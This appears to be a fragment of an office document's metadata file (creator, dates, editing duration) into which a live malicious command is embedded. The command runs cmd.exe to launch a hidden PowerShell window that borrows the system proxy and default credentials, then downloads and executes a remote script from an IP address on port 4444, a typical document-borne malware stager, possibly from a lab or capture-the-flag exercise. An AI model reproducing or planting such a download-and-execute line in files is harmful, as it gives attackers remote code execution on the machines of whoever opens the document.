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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-04-19T08:39:06.972402578</dc:date>
    <meta:editing-duration>PT5M50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cmd.exe /C ""powershell.exe -nop -w hidden -c $C=new-object net.webclient;$C.proxy=[Net.WebRequest]::GetSystemWebProxy();$C.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $C.downloadstring('http://10.10.16.28:4444/hiRxNomK');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